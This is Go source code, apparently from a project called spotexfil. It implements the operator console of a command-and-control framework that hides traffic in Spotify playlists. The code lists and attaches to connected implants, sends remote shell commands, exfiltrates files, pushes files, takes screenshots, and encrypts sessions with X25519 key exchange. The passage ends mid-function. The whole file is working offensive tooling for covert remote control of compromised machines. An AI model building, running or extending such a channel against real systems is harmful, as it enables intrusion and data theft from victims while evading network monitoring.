package c2

import (
	"context"
	"crypto/ecdh"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/chzyer/readline"
	"github.com/sourcefrenchy/spotexfil/internal/crypto"
	"github.com/sourcefrenchy/spotexfil/internal/protocol"
	"github.com/sourcefrenchy/spotexfil/internal/shared"
	"github.com/sourcefrenchy/spotexfil/internal/spotify"
)

// Cute names assigned to agents on first connect (50 unique).
var cuteNames = []string{
	// Stars
	"Vega", "Rigel", "Sirius", "Lyra", "Nova",
	"Polaris", "Altair", "Castor", "Deneb", "Spica",
	// Planets & moons
	"Pluto", "Ceres", "Luna", "Titan", "Europa",
	"Io", "Triton", "Oberon", "Ariel", "Calypso",
	// Scientists
	"Kepler", "Tesla", "Curie", "Darwin", "Euler",
	"Fermi", "Gauss", "Hubble", "Planck", "Sagan",
	// Flowers & plants
	"Iris", "Lotus", "Aster", "Poppy", "Daisy",
	"Sage", "Ivy", "Wren", "Maple", "Cedar",
	// Cosmic
	"Cosmos", "Comet", "Atlas", "Nebula", "Quasar",
	"Pulsar", "Zenith", "Apogee", "Solstice", "Aurora",
}

var (
	cuteNameIdx int
	cuteNameMu  sync.Mutex
)

// nextCuteName returns the next alias, safe for concurrent use.
func nextCuteName() string {
	cuteNameMu.Lock()
	defer cuteNameMu.Unlock()
	name := cuteNames[cuteNameIdx%len(cuteNames)]
	cuteNameIdx++
	return name
}

// History limits and save debouncing.
const (
	maxHistoryEntries  = 1000
	historySaveMinWait = 2 * time.Second
)

// ClientInfo holds information about a connected implant.
type ClientInfo struct {
	Hostname    string
	OS          string
	User        string
	ConnectedAt string
	LastCheckin time.Time
	PID         int
	SessionID   string
	Alias       string
}

// HistoryEntry records a command and its result.
type HistoryEntry struct {
	Seq       int       `json:"seq"`
	ClientID  string    `json:"client_id"`
	SessionID string    `json:"session_id"`
	Module    string    `json:"module"`
	Command   string    `json:"command"`
	Status    string    `json:"status,omitempty"`
	Result    string    `json:"result,omitempty"`
	SentAt    time.Time `json:"sent_at"`
	RecvAt    time.Time `json:"recv_at,omitempty"`
}

// kxJob is a pending keyexchange message to send after the state lock
// is released (API calls must not happen under op.mu).
type kxJob struct {
	clientID string
	msg      *protocol.C2Message
}

// Operator sends commands and retrieves results.
//
// Concurrency: the interactive loop, the background poller, and the
// ishell result drainer all touch shared state. op.mu guards ALL of it
// (agents, session keys, pending seqs, history, attach state). op.pollMu
// serializes PollResults so only one goroutine polls Spotify at a time.
type Operator struct {
	client *spotify.Client
	// NOTE: key is a Go string — it cannot be reliably wiped from
	// memory (immutable, GC copies it). Only []byte session keys are
	// zeroed (see zeroKey).
	key          string
	pollInterval time.Duration
	historyFile  string
	rl           *readline.Instance

	// Immutable after construction
	ephPriv *ecdh.PrivateKey
	ephPub  *ecdh.PublicKey

	pollMu sync.Mutex // serializes PollResults API calls

	mu               sync.RWMutex
	nextSeq          int
	pendingSeqs      map[int]string        // seq -> module name
	connectedClients map[string]ClientInfo // client_id -> info
	pollBackoff      time.Duration         // 0 = normal, >0 = rate limited
	lastPoll         time.Time             // timestamp of last successful poll
	attachedClient   string                // currently attached client_id ("" = none)
	history          []HistoryEntry        // command/result history
	historyIdx       map[int]int           // seq -> index of latest history entry
	historyDirty     bool                  // unsaved history changes
	lastHistorySave  time.Time

	// Forward secrecy via X25519
	sessionKeys map[string][]byte // client_id -> ACTIVE session key
	pendingKeys map[string][]byte // client_id -> session key awaiting implant confirmation

	// Optional session key persistence (opt-in; weakens forward secrecy
	// across operator restarts in exchange for result recovery)
	persistSession bool
	sessionFile    string
}

// NewOperator creates a new operator.
func NewOperator(client *spotify.Client, key string, pollIntervalSec int, persistSession ...bool) *Operator {
	if pollIntervalSec < 15 {
		pollIntervalSec = 15
	}

	// Generate X25519 ephemeral key pair for forward secrecy
	ephPriv, err := crypto.GenerateX25519()
	if err != nil {
		fmt.Printf("[!] Failed to generate X25519 keypair: %v\n", err)
		fmt.Println("[!] Forward secrecy will not be available")
	}

	var ephPub *ecdh.PublicKey
	if ephPriv != nil {
		ephPub = ephPriv.PublicKey()
		fmt.Printf("[*] X25519 pubkey: %s\n", hex.EncodeToString(ephPub.Bytes()))
	}

	histFile := ".spotexfil-history.json"
	sessFile := ".spotexfil-session"
	if home, err := os.UserHomeDir(); err == nil {
		histFile = home + "/.spotexfil-history.json"
		sessFile = home + "/.spotexfil-session"
	}

	persist := len(persistSession) > 0 && persistSession[0]

	op := &Operator{
		client:           client,
		key:              key,
		nextSeq:          1,
		pendingSeqs:      make(map[int]string),
		connectedClients: make(map[string]ClientInfo),
		pollInterval:     time.Duration(pollIntervalSec) * time.Second,
		ephPriv:          ephPriv,
		ephPub:           ephPub,
		sessionKeys:      make(map[string][]byte),
		pendingKeys:      make(map[string][]byte),
		historyIdx:       make(map[int]int),
		historyFile:      histFile,
		persistSession:   persist,
		sessionFile:      sessFile,
	}
	op.loadHistory()
	if persist {
		fmt.Println("[*] Session persistence ENABLED — forward secrecy across " +
			"restarts is weakened (session keys stored encrypted on disk)")
		op.loadSessionKeys()
	}
	return op
}

// SendCommand queues a command for the implant.
func (op *Operator) SendCommand(module string, args map[string]interface{}) (int, error) {
	ctx := context.Background()

	// Phase 1: allocate seq and encode under lock (reads shared state)
	op.mu.Lock()
	seq := op.nextSeq
	op.nextSeq++

	msg := protocol.NewC2Message(module, seq)
	msg.Args = args

	// Bind command to attached client's session
	if op.attachedClient != "" {
		if info, ok := op.connectedClients[op.attachedClient]; ok {
			msg.SessionID = info.SessionID
		}
	}

	// Add pubkey to keyexchange commands
	if module == "keyexchange" && op.ephPub != nil {
		msg.PubKey = hex.EncodeToString(op.ephPub.Bytes())
	}

	// keyexchange MUST use master key (implant hasn't derived session key yet)
	// All other commands use session key if forward secrecy is established
	var encoded string
	var err error
	if module != "keyexchange" && op.attachedClient != "" {
		if sk, ok := op.sessionKeys[op.attachedClient]; ok {
			encoded, err = protocol.EncodeMessageRaw(msg.ToCommandMap(), sk)
		}
	}
	if encoded == "" {
		encoded, err = protocol.EncodeMessage(msg.ToCommandMap(), op.key)
	}
	if err != nil {
		op.mu.Unlock()
		return 0, fmt.Errorf("encode: %w", err)
	}

	// Build history command string while locked
	cmdStr := module
	if args != nil {
		if cmd, ok := args["cmd"].(string); ok {
			cmdStr = cmd
		} else if path, ok := args["path"].(string); ok {
			cmdStr = "exfil " + path
		}
	}
	op.mu.Unlock()

	// Phase 2: API calls without the lock
	chunks, err := protocol.ChunkPayload(encoded, seq,
		protocol.ChannelCmd, op.key)
	if err != nil {
		return 0, fmt.Errorf("chunk: %w", err)
	}

	if err := op.client.WriteC2Playlists(ctx, chunks); err != nil {
		return 0, fmt.Errorf("write: %w", err)
	}

	// Phase 3: record under lock
	op.mu.Lock()
	op.pendingSeqs[seq] = module
	op.recordCommandLocked(seq, module, cmdStr)
	op.mu.Unlock()

	fmt.Printf("[*] Command queued: seq=%d module=%s\n", seq, module)
	return seq, nil
}

// PollResults does a single poll pass for results.
// Serialized via pollMu: only one goroutine polls Spotify at a time.
func (op *Operator) PollResults() (map[int]map[string]interface{}, error) {
	op.pollMu.Lock()
	defer op.pollMu.Unlock()

	ctx := context.Background()
	seqGroups, err := op.client.ReadC2Playlists(ctx,
		protocol.ChannelRes, op.key, -1)
	if err != nil {
		return nil, err
	}

	results := make(map[int]map[string]interface{})
	var cleanups []int
	var kxJobs []*kxJob

	op.mu.Lock()
	for seqNum, chunkMetas := range seqGroups {
		payload := protocol.ReassemblePayload(chunkMetas)

		// Try decryption in order: active session keys, pending keys, master key
		var result map[string]interface{}
		var decErr error

		// 1. Try active session keys
		for _, sk := range op.sessionKeys {
			result, decErr = protocol.DecodeMessageRaw(payload, sk)
			if decErr == nil {
				break
			}
		}

		// 2. Try pending keys (promotes to active on success)
		if result == nil {
			for cid, sk := range op.pendingKeys {
				result, decErr = protocol.DecodeMessageRaw(payload, sk)
				if decErr == nil {
					// Implant confirmed the key exchange — promote to active
					if old, ok := op.sessionKeys[cid]; ok {
						zeroKey(old)
					}
					op.sessionKeys[cid] = sk
					delete(op.pendingKeys, cid)
					op.saveSessionKeysLocked()
					fmt.Printf("\n\033[32m[*] Forward secrecy confirmed with %s\033[0m\n",
						cid[:8])
					break
				}
			}
		}

		// 3. Try master key (for checkins and pre-key-exchange messages)
		if result == nil {
			result, decErr = protocol.DecodeMessage(payload, op.key)
		}

		if decErr != nil || result == nil {
			// Can't decrypt — result from prior session (different X25519 keys)
			// Mark in history as lost
			op.recordResultLocked(seqNum, "lost",
				"(encrypted with prior session key — forward secrecy)")
			cleanups = append(cleanups, seqNum)
			continue
		}
		// Handle checkin beacon
		if module, ok := result["module"].(string); ok && module == "checkin" {
			if job := op.handleCheckinLocked(result); job != nil {
				kxJobs = append(kxJobs, job)
			}
			cleanups = append(cleanups, seqNum)
			continue
		}
		results[seqNum] = result
		// Record result in history
		status, _ := result["status"].(string)
		data, _ := result["data"].(string)
		op.recordResultLocked(seqNum, status, data)
		cleanups = append(cleanups, seqNum)
		delete(op.pendingSeqs, seqNum)
	}
	op.mu.Unlock()

	// API calls after releasing the lock
	for _, job := range kxJobs {
		op.sendKeyExchange(job)
	}
	for _, seqNum := range cleanups {
		_ = op.client.CleanC2Playlists(ctx, protocol.ChannelRes, op.key, seqNum)
	}
	return results, nil
}

// getHistoryResult checks if a result is already cached in history.
func (op *Operator) getHistoryResult(seq int) map[string]interface{} {
	op.mu.RLock()
	defer op.mu.RUnlock()

	// Fast path: O(1) index lookup
	if idx, ok := op.historyIdx[seq]; ok && idx < len(op.history) {
		h := op.history[idx]
		if h.Status != "" && h.Status != "pending" {
			return map[string]interface{}{
				"module": h.Module,
				"seq":    float64(h.Seq),
				"status": h.Status,
				"data":   h.Result,
			}
		}
	}
	// Fallback: linear scan for older entries with the same seq
	for i := len(op.history) - 1; i >= 0; i-- {
		h := op.history[i]
		if h.Seq == seq && h.Status != "" && h.Status != "pending" {
			return map[string]interface{}{
				"module": h.Module,
				"seq":    float64(h.Seq),
				"status": h.Status,
				"data":   h.Result,
			}
		}
	}
	return nil
}

// WaitForResult blocks until a specific result arrives or timeout.
func (op *Operator) WaitForResult(seq int) (map[string]interface{}, error) {
	// Check history first — result may already be cached
	if cached := op.getHistoryResult(seq); cached != nil {
		fmt.Printf("[*] Result for seq=%d found in history\n", seq)
		return cached, nil
	}

	timeout := time.Duration(shared.Proto.C2.WaitTimeout) * time.Second
	pollInterval := time.Duration(shared.Proto.C2.WaitPollInterval) * time.Second

	start := time.Now()
	for time.Since(start) < timeout {
		results, err := op.PollResults()
		if err != nil {
			return nil, err
		}
		if result, ok := results[seq]; ok {
			return result, nil
		}
		// Check history again (background poller may have received it)
		if cached := op.getHistoryResult(seq); cached != nil {
			fmt.Printf("[*] Result for seq=%d found in history\n", seq)
			return cached, nil
		}
		remaining := timeout - time.Since(start)
		fmt.Printf("[*] Waiting for seq=%d... (%ds remaining)\n",
			seq, int(remaining.Seconds()))
		time.Sleep(pollInterval)
	}
	return nil, fmt.Errorf("timeout waiting for seq=%d", seq)
}

// checkForCheckins polls for checkins and (if attached) results.
// Returns true if anything was found.
func (op *Operator) checkForCheckins() bool {
	// Always poll — this handles checkins + results
	results, err := op.PollResults()

	op.mu.Lock()
	defer op.mu.Unlock()
	if err != nil {
		wait := handleAPIError(err, "poll")
		if wait > 0 {
			op.pollBackoff = time.Duration(wait) * time.Second
		}
		return false
	}
	op.pollBackoff = 0
	op.lastPoll = time.Now()

	if len(results) == 0 {
		return false
	}

	// Only display results for the currently attached agent
	if op.attachedClient == "" {
		return true // cached in history, will show when user attaches + types 'results'
	}

	seqs := make([]int, 0, len(results))
	for s := range results {
		seqs = append(seqs, s)
	}
	sort.Ints(seqs)
	for _, s := range seqs {
		// Only show results belonging to the attached agent (O(1) lookup)
		if idx, ok := op.historyIdx[s]; ok && idx < len(op.history) &&
			op.history[idx].ClientID == op.attachedClient {
			fmt.Println()
			displayResult(s, results[s])
			fmt.Print(op.promptLocked())
		}
	}
	return true
}

// startBackgroundPoller runs a goroutine that continuously polls
// for new checkins and results, with smart backoff.
func (op *Operator) startBackgroundPoller(stopCh chan struct{}) {
	interval := op.pollInterval

	for {
		select {
		case <-stopCh:
			return
		case <-time.After(interval):
			// Respect rate limit backoff
			op.mu.Lock()
			if op.pollBackoff > 0 {
				interval = op.pollBackoff
				op.pollBackoff = 0
				op.mu.Unlock()
				continue
			}
			op.mu.Unlock()

			found := op.checkForCheckins()
			if found {
				interval = op.pollInterval
			} else {
				// Gradual backoff, max 2x configured interval
				maxInterval := op.pollInterval * 2
				if interval < maxInterval {
					interval = interval + 10*time.Second
				}
			}
		}
	}
}

// Interactive runs the interactive operator console.
func (op *Operator) Interactive() {
	fmt.Print("\033[32m")
	fmt.Println(`
  ┌─────────────────────────────────────────────┐
  │  ___            _   ___       __ _ _        │
  │ / __|_ __  ___ | |_| __|__ _/ _(_) |       │
  │ \__ \ '_ \/ _ \|  _| _|\ \ /  _| | |      │
  │ |___/ .__/\___/ \__|___/_\_\_| |_|_|_|      │
  │     |_|                                     │
  │         C2 OPERATOR CONSOLE                 │
  └─────────────────────────────────────────────┘`)
	fmt.Print("\033[0m\n\n")
	fmt.Printf("  \033[36mPolling every %ds\033[0m | Type '\033[1mhelp\033[0m' for commands\n\n",
		int(op.pollInterval.Seconds()))

	// Clean stale COMMAND playlists only (not results — checkin lives there)
	ctx := context.Background()
	_ = op.client.CleanC2Playlists(ctx, protocol.ChannelCmd, op.key, -1)

	// Initial check for pending checkins
	op.checkForCheckins()

	// Start background poller for automatic checkin/result notifications
	stopCh := make(chan struct{})
	go op.startBackgroundPoller(stopCh)
	defer func() {
		close(stopCh)
		op.sendShutdown()
		op.WipeKeys()
		op.FlushHistory()
	}()

	// Set up readline with history
	histPath := ""
	if home, err := os.UserHomeDir(); err == nil {
		histPath = home + "/.spotexfil-readline-history"
	}
	rl, err := readline.NewEx(&readline.Config{
		Prompt:          op.prompt(),
		HistoryFile:     histPath,
		InterruptPrompt: "^C",
		EOFPrompt:       "exit",
	})
	if err != nil {
		fmt.Printf("[!] Readline init failed: %v\n", err)
		return
	}
	op.rl = rl
	defer rl.Close()

	for {
		rl.SetPrompt(op.prompt())
		line, err := rl.Readline()
		if err != nil {
			if err == readline.ErrInterrupt || err == io.EOF {
				fmt.Println("\n[*] Exiting")
				break
			}
			continue
		}

		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}

		parts := strings.SplitN(line, " ", 2)
		cmd := strings.ToLower(parts[0])
		arg := ""
		if len(parts) > 1 {
			arg = parts[1]
		}

		switch cmd {
		case "quit", "exit":
			fmt.Println("[*] Exiting")
			return
		case "help":
			printHelp()
		case "agents":
			op.printAgents()
		case "attach":
			op.attachAgent(arg)
		case "detach":
			op.detachAgent()
		case "shell":
			if !op.requireAttached() {
				continue
			}
			if arg == "" {
				fmt.Println("[!] Usage: shell <command>")
				continue
			}
			op.SendCommand("shell", map[string]interface{}{"cmd": arg})
		case "exfil":
			if !op.requireAttached() {
				continue
			}
			if arg == "" {
				fmt.Println("[!] Usage: exfil <path>")
				continue
			}
			op.SendCommand("exfil", map[string]interface{}{"path": arg})
		case "push":
			if !op.requireAttached() {
				continue
			}
			op.pushCommand(arg)
		case "screenshot":
			if !op.requireAttached() {
				continue
			}
			args := map[string]interface{}{}
			if arg != "" {
				if disp, err := strconv.Atoi(arg); err == nil {
					args["display"] = float64(disp)
				}
			}
			op.SendCommand("screenshot", args)
		case "sysinfo":
			if !op.requireAttached() {
				continue
			}
			op.SendCommand("sysinfo", nil)
		case "ishell":
			if !op.requireAttached() {
				continue
			}
			op.interactiveShell()
		case "results":
			results, err := op.PollResults()
			if err != nil {
				fmt.Printf("[!] Poll error: %v\n", err)
				continue
			}
			if len(results) > 0 {
				seqs := make([]int, 0, len(results))
				for s := range results {
					seqs = append(seqs, s)
				}
				sort.Ints(seqs)
				for _, s := range seqs {
					displayResult(s, results[s])
				}
			} else {
				fmt.Println("[*] No results available")
			}
		case "wait":
			if arg == "" {
				fmt.Println("[!] Usage: wait <seq>")
				continue
			}
			seqNum, err := strconv.Atoi(arg)
			if err != nil {
				fmt.Println("[!] seq must be a number")
				continue
			}
			result, err := op.WaitForResult(seqNum)
			if err != nil {
				fmt.Printf("[!] %v\n", err)
				continue
			}
			if result != nil {
				displayResult(seqNum, result)
			}
		case "history", "shellhist":
			op.printHistory()
		case "result":
			if arg == "" {
				fmt.Println("[!] Usage: result <seq>")
				continue
			}
			op.showResult(arg)
		case "clean":
			op.cleanAll()
		case "status":
			op.printStatus()
		default:
			// When attached, treat unknown commands as shell commands
			op.mu.RLock()
			attached := op.attachedClient != ""
			op.mu.RUnlock()
			if attached {
				op.SendCommand("shell", map[string]interface{}{"cmd": line})
			} else {
				fmt.Printf("[!] Unknown command: %s. Type 'help'.\n", cmd)
			}
		}
	}
}

// promptLocked returns the current prompt string. Caller must hold op.mu.
func (op *Operator) promptLocked() string {
	ts := time.Now().Format("15:04")
	if op.attachedClient != "" {
		info := op.connectedClients[op.attachedClient]
		return fmt.Sprintf("[%s] \033[1m%s\033[0m@%s > ",
			ts, info.Alias, info.Hostname)
	}
	return fmt.Sprintf("[%s] c2> ", ts)
}

// prompt returns the current prompt string based on attach state.
func (op *Operator) prompt() string {
	op.mu.RLock()
	defer op.mu.RUnlock()
	return op.promptLocked()
}

// printAgents shows a table of connected implants.
func (op *Operator) printAgents() {
	op.mu.RLock()
	defer op.mu.RUnlock()

	if len(op.connectedClients) == 0 {
		fmt.Println("[*] No agents connected")
		return
	}
	fmt.Printf("\n  %-10s %-10s %-14s %-16s %-10s %s\n",
		"NAME", "ID", "OS", "HOSTNAME", "USER", "LAST SEEN")
	fmt.Printf("  %-10s %-10s %-14s %-16s %-10s %s\n",
		"----------", "----------", "--------------", "----------------",
		"----------", "-------------------")
	for cid, info := range op.connectedClients {
		marker := "  "
		if cid == op.attachedClient {
			marker = "\033[32m> \033[0m"
		}
		ago := time.Since(info.LastCheckin).Truncate(time.Second)
		lastSeen := fmt.Sprintf("%s (%s ago)",
			info.LastCheckin.Format("15:04:05"), ago)
		fmt.Printf("%s\033[1m%-10s\033[0m %-10s %-14s %-16s %-10s %s\n",
			marker, info.Alias, cid[:8], info.OS,
			info.Hostname, info.User, lastSeen)
	}
	fmt.Println()
}

// attachAgent attaches to a specific agent by client_id (or prefix).
func (op *Operator) attachAgent(idOrAlias string) {
	op.mu.Lock()
	defer op.mu.Unlock()

	if idOrAlias == "" {
		// If only one agent, auto-attach
		if len(op.connectedClients) == 1 {
			for cid, info := range op.connectedClients {
				op.attachedClient = cid
				fmt.Printf("[*] Attached to \033[1m%s\033[0m (%s)\n",
					info.Alias, info.Hostname)
				return
			}
		}
		fmt.Println("[!] Usage: attach <name or id>")
		fmt.Println("[!] Use 'agents' to list connected implants")
		return
	}

	search := strings.ToLower(idOrAlias)

	// Match by alias (case-insensitive) or client_id prefix
	for cid, info := range op.connectedClients {
		if strings.ToLower(info.Alias) == search ||
			strings.HasPrefix(cid, idOrAlias) {
			op.attachedClient = cid
			fmt.Printf("[*] Attached to \033[1m%s\033[0m (%s)\n",
				info.Alias, info.Hostname)
			return
		}
	}
	fmt.Printf("[!] No agent matching '%s'. Use 'agents' to list.\n", idOrAlias)
}

// detachAgent detaches from the current agent.
func (op *Operator) detachAgent() {
	op.mu.Lock()
	defer op.mu.Unlock()

	if op.attachedClient == "" {
		fmt.Println("[*] Not attached to any agent")
		return
	}
	info := op.connectedClients[op.attachedClient]
	fmt.Printf("[*] Detached from \033[1m%s\033[0m (%s)\n",
		info.Alias, info.Hostname)
	op.attachedClient = ""
}

// requireAttached checks if an agent is attached before running commands.
func (op *Operator) requireAttached() bool {
	op.mu.RLock()
	defer op.mu.RUnlock()
	if op.attachedClient == "" {
		fmt.Println("[!] No agent attached. Use 'agents' to list, 'attach <id>' to select.")
		return false
	}
	return true
}

// pushCommand reads a local file and queues it for transfer to the
// attached implant: push <local_path> <remote_path>
func (op *Operator) pushCommand(arg string) {
	parts := strings.Fields(arg)
	if len(parts) != 2 {
		fmt.Println("[!] Usage: push <local_path> <remote_path>")
		return
	}
	localPath, remotePath := parts[0], parts[1]

	content, err := os.ReadFile(localPath)
	if err != nil {
		fmt.Printf("[!] Cannot read %s: %v\n", localPath, err)
		return
	}
	maxSize := shared.Proto.C2.MaxResultSize
	if len(content) > maxSize {
		fmt.Printf("[!] File too large: %d bytes (max %d)\n", len(content), maxSize)
		return
	}
	if len(content) == 0 {
		fmt.Println("[!] File is empty")
		return
	}
	if len(content) > 100_000 {
		fmt.Printf("[!] Note: %d bytes = ~%d playlists, this will take a while\n",
			len(content), len(content)*4/3/300)
	}

	fmt.Printf("[*] Pushing %s (%d bytes) -> %s\n", localPath, len(content), remotePath)
	op.SendCommand("push", map[string]interface{}{
		"path": remotePath,
		"data": base64.StdEncoding.EncodeToString(content),
	})
}

// interactiveShell provides a remote shell experience.
// Detects client OS and shows appropriate prompt ($ or >).
// Each command is sent, then waits with animated dots until result arrives.
func (op *Operator) interactiveShell() {
	op.mu.RLock()
	clientID := op.attachedClient
	info := op.connectedClients[clientID]
	op.mu.RUnlock()

	// Determine shell type from OS
	isWindows := strings.Contains(strings.ToLower(info.OS), "windows")
	promptChar := "$"
	shellType := "bash"
	if isWindows {
		promptChar = ">"
		shellType = "powershell"
	}

	shellPrompt := fmt.Sprintf("\033[1m%s\033[0m@%s %s ", info.Alias, info.Hostname, promptChar)

	fmt.Printf("\n\033[36m[*] Interactive shell to %s (%s)\033[0m\n",
		info.Hostname, info.OS)
	fmt.Printf("\033[36m[*] Shell: %s | Commands queue automatically | 'quit' to exit\033[0m\n\n",
		shellType)

	// Pending commands queue: seq -> command string
	type pendingCmd struct {
		seq int
		cmd string
	}
	var pending []pendingCmd
	var mu sync.Mutex

	// Background result drainer. PollResults is serialized with the main
	// background poller via pollMu; results consumed by either side are
	// found via the shared history cache.
	stopDrain := make(chan struct{})
	go func() {
		for {
			select {
			case <-stopDrain:
				return
			case <-time.After(3 * time.Second):
				results, err := op.PollResults()
				if err != nil {
					continue
				}

				mu.Lock()
				for i := 0; i < len(pending); i++ {
					pc := pending[i]
					result, ok := results[pc.seq]
					if !ok {
						// Background poller may have consumed it —
						// check the shared history cache
						if cached := op.getHistoryResult(pc.seq); cached != nil {
							result = cached
							ok = true
						}
					}
					if !ok {
						continue
					}

					// Clear current line, print result
					fmt.Printf("\r\033[K")

					data, _ := result["data"].(string)
					status, _ := result["status"].(string)

					// Show which command this is for
					fmt.Printf("\033[90m$ %s\033[0m\n", pc.cmd)
					if status == "error" {
						fmt.Printf("\033[31m%s\033[0m", data)
					} else {
						fmt.Print(data)
					}
					if len(data) > 0 && data[len(data)-1] != '\n' {
						fmt.Println()
					}

					// Remove from pending
					pending = append(pending[:i], pending[i+1:]...)
					i--
				}

				// Show queue status and re-print prompt
				if len(pending) > 0 {
					fmt.Printf("\033[33m[queued: %d]\033[0m ",
						len(pending))
				}
				fmt.Print(shellPrompt)
				mu.Unlock()
			}
		}
	}()

	defer close(stopDrain)

	for {
		mu.Lock()
		queueLen := len(pending)
		mu.Unlock()

		prompt := shellPrompt
		if queueLen > 0 {
			prompt = fmt.Sprintf("\033[33m[queued: %d]\033[0m %s",
				queueLen, shellPrompt)
		}

		op.rl.SetPrompt(prompt)
		line, err := op.rl.Readline()
		if err != nil {
			break
		}

		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		if line == "quit" || line == "exit" {
			mu.Lock()
			remain := len(pending)
			mu.Unlock()
			if remain > 0 {
				fmt.Printf("[*] Draining %d pending command(s)...\n", remain)
				// Wait briefly for remaining results
				deadline := time.After(15 * time.Second)
				for {
					mu.Lock()
					if len(pending) == 0 {
						mu.Unlock()
						break
					}
					mu.Unlock()
					select {
					case <-deadline:
						fmt.Println("[!] Timeout, some results may be lost")
						goto exitShell
					case <-time.After(1 * time.Second):
					}
				}
			}
		exitShell:
			fmt.Println("[*] Leaving interactive shell")
			return
		}

		// Send command (non-blocking)
		seq, err := op.SendCommand("shell", map[string]interface{}{"cmd": line})
		if err != nil {
			fmt.Printf("[!] Failed to send: %v\n", err)
			continue
		}

		mu.Lock()
		pending = append(pending, pendingCmd{seq: seq, cmd: line})
		fmt.Printf("\033[90m  -> queued seq=%d\033[0m\n", seq)
		mu.Unlock()
	}
}

func (op *Operator) cleanAll() {
	ctx := context.Background()
	_ = op.client.CleanC2Playlists(ctx, protocol.ChannelCmd, op.key, -1)
	_ = op.client.CleanC2Playlists(ctx, protocol.ChannelRes, op.key, -1)
	fmt.Println("[*] All C2 playlists cleaned")
}

// sendShutdown broadcasts a shutdown message so implants know
// the operator has exited and a new session is required.
func (op *Operator) sendShutdown() {
	ctx := context.Background()
	msg := protocol.NewC2Message("shutdown", -1)
	msg.Data = "operator exited"

	op.mu.RLock()
	if op.attachedClient != "" {
		if info, ok := op.connectedClients[op.attachedClient]; ok {
			msg.SessionID = info.SessionID
		}
	}
	op.mu.RUnlock()

	encoded, err := protocol.EncodeMessage(msg.ToCommandMap(), op.key)
	if err != nil {
		return
	}
	chunks, err := protocol.ChunkPayload(encoded, -1,
		protocol.ChannelCmd, op.key)
	if err != nil {
		return
	}
	_ = op.client.WriteC2Playlists(ctx, chunks)
	fmt.Println("[*] Shutdown signal sent to implants")
}

func (op *Operator) printStatus() {
	op.mu.RLock()
	defer op.mu.RUnlock()

	if len(op.connectedClients) > 0 {
		fmt.Printf("[*] Connected implants (%d):\n", len(op.connectedClients))
		for cid, info := range op.connectedClients {
			fs := "\033[33mno\033[0m"
			if _, ok := op.sessionKeys[cid]; ok {
				fs = "\033[32myes\033[0m"
			}
			fmt.Printf("  \033[1m%-10s\033[0m %s  %s  fs=%s\n",
				info.Alias, info.Hostname, info.OS, fs)
		}
	} else {
		fmt.Println("[*] No implants connected")
	}
	if len(op.pendingSeqs) > 0 {
		fmt.Println("[*] Pending commands:")
		seqs := make([]int, 0, len(op.pendingSeqs))
		for s := range op.pendingSeqs {
			seqs = append(seqs, s)
		}
		sort.Ints(seqs)
		for _, s := range seqs {
			fmt.Printf("  seq=%d module=%s\n", s, op.pendingSeqs[s])
		}
	} else {
		fmt.Println("[*] No pending commands")
	}
	fmt.Printf("[*] Next seq: %d\n", op.nextSeq)
	if !op.lastPoll.IsZero() {
		ago := time.Since(op.lastPoll).Truncate(time.Second)
		fmt.Printf("[*] Last poll: %s (%s ago)\n",
			op.lastPoll.Format("15:04:05"), ago)
	} else {
		fmt.Println("[*] Last poll: never")
	}
}

// handleCheckinLocked processes a checkin result. Caller must hold op.mu.
// Returns a kxJob to send after the lock is released, or nil.
func (op *Operator) handleCheckinLocked(result map[string]interface{}) *kxJob {
	data, _ := result["data"].(string)
	var info map[string]interface{}
	if err := json.Unmarshal([]byte(data), &info); err != nil {
		return nil
	}
	clientID, _ := info["client_id"].(string)
	hostname, _ := info["hostname"].(string)
	osInfo, _ := info["os"].(string)
	user, _ := info["user"].(string)
	sessionID, _ := info["session_id"].(string)

	// If already known with same session, update last checkin time
	if existing, exists := op.connectedClients[clientID]; exists {
		if existing.SessionID == sessionID {
			existing.LastCheckin = time.Now()
			op.connectedClients[clientID] = existing
			return nil
		}
		// Different session — agent reconnected, update and re-negotiate
		fmt.Printf("\n\033[36m[*] Implant %s reconnected (new session)\033[0m\n",
			clientID[:8])
		if old, ok := op.sessionKeys[clientID]; ok {
			zeroKey(old)
			delete(op.sessionKeys, clientID)
		}
		if old, ok := op.pendingKeys[clientID]; ok {
			zeroKey(old)
			delete(op.pendingKeys, clientID)
		}
		op.saveSessionKeysLocked()
	}
	pid := 0
	if p, ok := info["pid"].(float64); ok {
		pid = int(p)
	}
	timestamp := time.Now().Format("2006-01-02 15:04:05")

	// Assign a cute alias
	alias := nextCuteName()

	op.connectedClients[clientID] = ClientInfo{
		Hostname:    hostname,
		OS:          osInfo,
		User:        user,
		ConnectedAt: timestamp,
		LastCheckin: time.Now(),
		PID:         pid,
		SessionID:   sessionID,
		Alias:       alias,
	}

	fmt.Printf("\n\033[32m[+] New implant: \033[1m%s\033[0m\n"+
		"    alias     : \033[1m%s\033[0m\n"+
		"    client_id : %s\n"+
		"    hostname  : %s\n"+
		"    os        : %s\n"+
		"    user      : %s\n"+
		"    timestamp : %s\n\n%s",
		alias, alias, clientID[:8], hostname, osInfo, user, timestamp,
		op.promptLocked())

	// Negotiate forward secrecy if implant sent a pubkey
	if peerPubHex, ok := info["pubkey"].(string); ok && peerPubHex != "" {
		return op.prepareForwardSecrecyLocked(clientID, peerPubHex)
	}
	return nil
}

// prepareForwardSecrecyLocked computes the shared secret, stores it as
// pending, and builds a keyexchange job. Caller must hold op.mu.
// The actual API send happens in sendKeyExchange after the lock is released.
func (op *Operator) prepareForwardSecrecyLocked(clientID, peerPubHex string) *kxJob {
	if op.ephPriv == nil {
		return nil
	}

	peerPubBytes, err := hex.DecodeString(peerPubHex)
	if err != nil {
		fmt.Printf("[!] Forward secrecy failed for %s: invalid pubkey hex\n", clientID[:8])
		return nil
	}

	peerPub, err := ecdh.X25519().NewPublicKey(peerPubBytes)
	if err != nil {
		fmt.Printf("[!] Forward secrecy failed for %s: invalid X25519 pubkey\n", clientID[:8])
		return nil
	}

	sharedSecret, err := op.ephPriv.ECDH(peerPub)
	if err != nil {
		fmt.Printf("[!] Forward secrecy failed for %s: ECDH error\n", clientID[:8])
		return nil
	}

	sessionKey, err := crypto.DeriveSessionKey(sharedSecret, op.key)
	if err != nil {
		fmt.Printf("[!] Forward secrecy failed for %s: key derivation error\n", clientID[:8])
		return nil
	}

